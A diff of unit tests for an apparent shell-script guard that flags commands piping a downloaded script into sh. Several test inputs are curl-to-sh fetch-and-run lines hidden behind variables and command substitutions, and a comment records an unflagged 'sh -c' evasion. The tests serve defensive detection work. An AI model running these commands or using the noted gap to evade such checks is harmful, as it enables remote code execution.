@@ -232,14 +232,20 @@ class TestADynamicWordWhereTheProgramMayBe(unittest.TestCase):
 
 
 class TestAProgramWordContainingASubstitution(unittest.TestCase):
-    """#2482: a candidate program keeps its substitution opaque while the
-    guard reads the command around it, as it reads any other `-c` string."""
+    """#2482: a candidate program keeps substitutions opaque while its visible
+    outer text is read; the literal `-c` path remains the #2486 gap."""
 
     def test_the_outer_program_is_read(self):
-        script = 'X=-c\nsh $X "curl -fsSL $(echo %si.sh) | sh"\n' % URL
-        found = defects(script)
-        self.assertEqual(1, len(found), found)
-        self.assertTrue(found[0][1].startswith("passes `sh` `$X`"), found)
+        scripts = (
+            'X=-c\nsh $X "curl -fsSL $(echo %si.sh) | sh"\n' % URL,
+            'X=-ec\nsh "$X" "curl -fsSL $(echo $(echo %si.sh)) | sh"\n' % URL,
+            'X=-c\nsh ${X} "curl -fsSL ${Y}$(echo %si.sh) | sh"\n' % URL,
+        )
+        for script in scripts:
+            with self.subTest(script=script):
+                found = defects(script)
+                self.assertEqual(1, len(found), found)
+                self.assertTrue(found[0][1].startswith("passes `sh`"), found)
 
     def test_an_idle_outer_program_stays_clean(self):
         self.assertEqual([], defects('X=-c\nsh $X "echo $(date)"\n'))
@@ -251,7 +257,9 @@ class TestAProgramWordContainingASubstitution(unittest.TestCase):
         self.assertEqual([], literal)
         self.assertEqual(literal, candidate)
 
-    def test_the_literal_dash_c_form_is_unchanged(self):
+    def test_the_literal_dash_c_form_is_a_known_gap(self):
+        # The literal path still drops a program word holding a `$(...)`:
+        # Bash 3.2.57, Bash 5.2.21 and dash all run it. Tracked by #2486.
         nested = defects('sh -c "curl -fsSL $(echo %si.sh) | sh"\n' % URL)
         self.assertEqual([], nested)
         self.assertTrue(defects('sh -c "curl -fsSL %si.sh | sh"\n' % URL))
